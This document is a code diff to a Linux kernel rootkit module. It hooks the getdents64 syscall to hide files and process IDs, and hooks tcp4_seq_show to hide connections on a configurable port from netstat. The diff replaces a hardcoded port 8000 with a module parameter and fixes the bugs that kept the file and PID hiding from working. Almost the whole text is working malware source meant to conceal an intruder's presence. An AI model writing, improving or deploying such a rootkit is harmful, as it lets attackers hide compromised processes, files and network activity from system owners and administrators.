@@ -42,6 +42,8 @@ int hide_string_from_dirent(struct linux_dirent64* dirent, char* string, int len
 char* file_to_hide = NULL;
 char* pid_to_hide = NULL;
 char* ip_to_block = NULL;
+__u16 port_to_hide = 0;
+
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("ROYCO");
@@ -56,6 +58,9 @@ MODULE_PARM_DESC(pid_to_hide, "pid to hide from getdents64 syscall- and from ps 
 
 
 module_param(ip_to_block, charp, 0000);
+MODULE_PARM_DESC(ip_to_block, "block ip from incomming traffic to userspace");
+
+module_param(port_to_hide, short, 0000);
 MODULE_PARM_DESC(ip_to_block, "block ip from incomming traffic to userspace");
 
 
@@ -139,26 +144,30 @@ static asmlinkage int new_m_show(struct seq_file *m, void *p)
 static asmlinkage int new_tcp4_seq_show(struct seq_file *seq, void *v)
 {
 	__u16 srcp;
-	const struct inet_sock *inet;
 	struct sock *sk = v;
+	const struct inet_sock *inet;
+
+	if (port_to_hide == 0)
+		goto done;
+
 	printk(KERN_INFO "hooked a call to tcp4_seq_show\n");
 	if (v == SEQ_START_TOKEN)
 		return old_tcp4_seq_show(seq, v);
 	inet = inet_sk(sk);
 	srcp = ntohs(inet->inet_sport);
-	if (srcp == 8000){
+	if (srcp == port_to_hide){
 		printk(KERN_INFO "netstat_rootkit: identified tcp traffic to port 8000\n");
 		seq_puts(seq, "");
 		return 0;
 	}
-	return old_tcp4_seq_show(seq, v);
+	done:
+		return old_tcp4_seq_show(seq, v);
 
 }
 
 /*
 hook the getdents64 syscall to allow hiding of files by name, and of proccesses by PID.
 those 2 are effectively the same, but I wanted to support an option where both will be required.
-the implementation came out clunky and full of boilerplate- sorry, I need to work on my C skillz -_- 
 */
 static asmlinkage int new_getdents64(const struct pt_regs *regs)
 {
@@ -198,14 +207,7 @@ static asmlinkage int new_getdents64(const struct pt_regs *regs)
 	error = copy_from_user(dirent_kern, dirent, len); //copy the struct to kernel buffer.
 	if (error)
 		goto done;
-	
 
-	curr_ent = (void*)dirent_kern + offset;
-	prev_ent = curr_ent;
-
-
-	prev_ent = curr_ent;
-	curr_ent = (void*)dirent_kern + offset;
 	if (hide_file)
 	{
 		len = hide_string_from_dirent(dirent_kern, file_to_hide, len);
@@ -222,9 +224,7 @@ static asmlinkage int new_getdents64(const struct pt_regs *regs)
 
 	done:
 		kfree(dirent_kern);
-		return len;
-	
-	
+		return len;	
 }
 
 int hide_string_from_dirent(struct linux_dirent64* dirent, char* string, int len)
@@ -241,12 +241,13 @@ int hide_string_from_dirent(struct linux_dirent64* dirent, char* string, int len
 	{
 		prev_ent = curr_ent;
 		curr_ent = (void*)dirent + offset;
-		if (strcmp(string,curr_ent->d_name))
+		if (strcmp(string,curr_ent->d_name) == 0)
 		{	
+			printk(KERN_INFO "found what we want to hide!: %s\n",string);
 			if (offset == 0 )// special case
 			{
 				new_len -= curr_ent->d_reclen;
-				memmove(curr_ent, curr_ent+curr_ent->d_reclen, len);
+				memmove(curr_ent, curr_ent+curr_ent->d_reclen, new_len);
 			}
 			else
 			{
